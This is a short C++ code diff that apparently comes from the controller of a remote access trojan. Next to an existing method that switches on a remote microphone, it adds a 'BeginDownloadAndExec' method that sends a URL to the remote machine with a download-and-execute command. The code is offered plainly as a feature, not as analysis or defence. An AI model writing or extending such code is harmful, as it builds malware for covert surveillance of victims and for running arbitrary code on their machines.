@@ -106,3 +106,8 @@ void CKernelSrv::BeginMicrophone()
 {
 	Send(KNEL_MICROPHONE, 0, 0);
 }
+
+void CKernelSrv::BeginDownloadAndExec(WCHAR szUrl[])
+{
+	Send(KNEL_DOWNANDEXEC, (char*)szUrl, (sizeof(WCHAR)*(wcslen(szUrl) + 1)));
+}
